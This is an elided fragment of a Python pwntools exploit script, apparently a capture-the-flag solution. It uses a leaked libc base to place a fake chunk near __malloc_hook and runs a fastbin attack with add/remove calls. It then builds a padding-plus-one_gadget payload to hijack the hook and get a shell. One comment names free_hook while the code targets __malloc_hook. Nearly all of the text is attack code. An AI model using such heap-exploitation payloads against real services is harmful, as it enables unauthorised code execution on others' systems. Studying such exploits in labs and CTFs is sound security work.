...
def pwn():
	...
	fake_chunk = libc_base + g_libc.symbols["__malloc_hook"] - 0x23

	log.success("libc@%#x\none_gadget@%#x\nfake_chunk@%#x" % (libc_base, one_gadget, fake_chunk))
	remove(1)	

	# 2. fastbin attack: allocate to free_hook, write one_gadget to it, then get shell
	add(0x60, "ccc") # 2
	add(0x60, "ddd") # 3
	remove(3)
	...
	payload_hijack = flat(['a'*(0x23-0x10), one_gadget])
